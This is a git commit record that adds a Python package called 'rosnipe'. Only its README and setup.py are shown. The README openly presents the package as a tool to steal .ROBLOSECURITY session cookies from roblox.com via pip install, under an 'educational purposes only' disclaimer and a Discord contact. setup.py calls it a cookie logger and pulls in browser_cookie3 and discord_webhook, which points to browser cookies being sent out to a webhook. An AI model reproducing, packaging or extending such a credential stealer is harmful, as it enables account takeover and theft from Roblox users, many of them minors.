ca3367823aa4d044058221de0d1b5d32963d25c7
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 01:56:54 +0000

    Add package rosnipe/0.0.1/rosnipe-0.0.1.tar.gz

---
+++ packages/rosnipe/rosnipe-0.0.1.tar.gz/rosnipe-0.0.1/README.txt
@@ -0,0 +1,7 @@
+# FOR EDUCATIONAL PURPOSES ONLY
+
+
+**discord.gg/comrades | kgb#3333**
+
+
+This is a tool that allows you to steal .ROBLOSECURITY cookies from https://roblox.com with a pip installation and a simple script.
---
+++ packages/rosnipe/rosnipe-0.0.1.tar.gz/rosnipe-0.0.1/setup.py
@@ -0,0 +1,24 @@
+from setuptools import setup, find_packages
+
+classifiers = [
+  'Development Status :: 5 - Production/Stable',
+  'Intended Audience :: Education',
+  'Operating System :: Microsoft :: Windows :: Windows 10',
+  'License :: OSI Approved :: MIT License',
+  'Programming Language :: Python :: 3'
+]
+
+setup(
+  name='rosnipe',
+  version='0.0.1',
+  description='A .ROBLOSECURITY cookie logger.',
+  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
+  url='',  
+  author='KGB',
+  author_email='kgb@comrades.gq',
+  license='MIT', 
+  classifiers=classifiers,
+  keywords='rosnipe', 
+  packages=find_packages(),
+  install_requires=['os', 'discord_webhook', 'browser_cookie3', 'requests']
+)
